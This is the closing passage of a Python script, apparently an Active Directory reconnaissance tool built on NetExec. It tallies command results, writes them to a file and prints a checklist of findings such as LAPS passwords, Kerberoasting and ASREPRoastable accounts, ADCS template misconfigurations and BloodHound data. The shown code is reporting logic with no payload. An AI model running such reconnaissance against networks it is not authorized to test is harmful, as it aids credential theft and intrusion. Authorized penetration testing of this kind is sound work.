    print(f"{Colors.BLUE}Built-in flags: {len(builtin_results)} ({Colors.GREEN}{sum(1 for r in builtin_results if r['returncode'] == 0)} successful{Colors.BLUE}){Colors.ENDC}")
    print(f"{Colors.BLUE}Custom modules: {len(module_results)} ({Colors.GREEN}{sum(1 for r in module_results if r['returncode'] == 0)} successful{Colors.BLUE}){Colors.ENDC}")
    
    if failed > 0:
        print(f"\n{Colors.FAIL}Failed commands:{Colors.ENDC}")
        for result in all_results:
            if result['returncode'] != 0:
                cmd_type = result['type']
                cmd_name = result.get('flag', result.get('module', 'unknown'))
                print(f"{Colors.RED}  - {result['protocol'].upper()}: {cmd_name} ({cmd_type}){Colors.ENDC}")
    
    # Save results to file if specified
    if args.output:
        try:
            with open(args.output, 'w') as f:
                f.write("Auto AD Recon NetExec Script Results\n")
                f.write("=" * 60 + "\n")
                f.write(f"Target: {args.target}\n")
                f.write(f"Protocols: {', '.join(args.protocols)}\n")
                f.write(f"Authentication: {'Null Session' if args.null_session else 'Credentials' if args.username else 'No Auth'}\n")
                if args.dns_server:
                    f.write(f"DNS Server: {args.dns_server}\n")
                f.write(f"Total commands: {len(all_results)}\n")
                f.write(f"Successful: {successful}\n")
                f.write(f"Failed: {failed}\n")
                f.write(f"Author: Abhishek Joshi (kernel-injection)\n")
                f.write(f"GitHub: https://github.com/kernel-injection\n\n")
                
                for result in all_results:
                    f.write(f"\n{'='*80}\n")
                    if result['type'] == 'builtin_flag':
                        f.write(f"Built-in Flag: {result['flag']} ({result['protocol'].upper()})\n")
                    else:
                        f.write(f"Module: {result['module']} ({result['protocol'].upper()})\n")
                        if result.get('options'):
                            f.write(f"Options: {result['options']}\n")
                    f.write(f"Return Code: {result['returncode']}\n")
                    if 'status' in result:
                        f.write(f"Status: {result['status']}\n")
                    f.write(f"{'='*80}\n")
                    f.write("STDOUT:\n")
                    f.write(result['stdout'])
                    f.write("\nSTDERR:\n")
                    f.write(result['stderr'])
                    f.write("\n")
            
            print_success(f"Results saved to: {args.output}")
            print(f"\n{Colors.YELLOW}Key findings to look for in the output:{Colors.ENDC}")
            findings = [
                "• User accounts and descriptions",
                "• Group memberships and privileged groups", 
                "• LAPS passwords and local admin accounts",
                "• Domain trusts and relationships",
                "• ADCS misconfigurations and certificate templates (ESC1-ESC8)",
                "• Network subnet information",
                "• Password policies (PSO)",
                "• Service accounts (Kerberoasting targets)",
                "• ASREPRoastable accounts",
                "• SMB shares and permissions",
                "• Active sessions and logged-on users",
                "• BloodHound data (if DNS server provided)"
            ]
            for finding in findings:
                print(f"{Colors.OKGREEN}{finding}{Colors.ENDC}")
            
        except Exception as e:
            print_error(f"Error saving results: {e}")

    print(f"\n{Colors.GRAY}{'='*120}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}Auto AD Recon completed successfully!{Colors.ENDC}")
    print(f"{Colors.BLUE}Author: {Colors.OKGREEN}Abhishek Joshi (kernel-injection){Colors.ENDC}")
    print(f"{Colors.BLUE}GitHub: {Colors.OKCYAN}https://github.com/kernel-injection{Colors.ENDC}")
    print(f"{Colors.GRAY}{'='*120}{Colors.ENDC}")

if __name__ == "__main__":
    main()
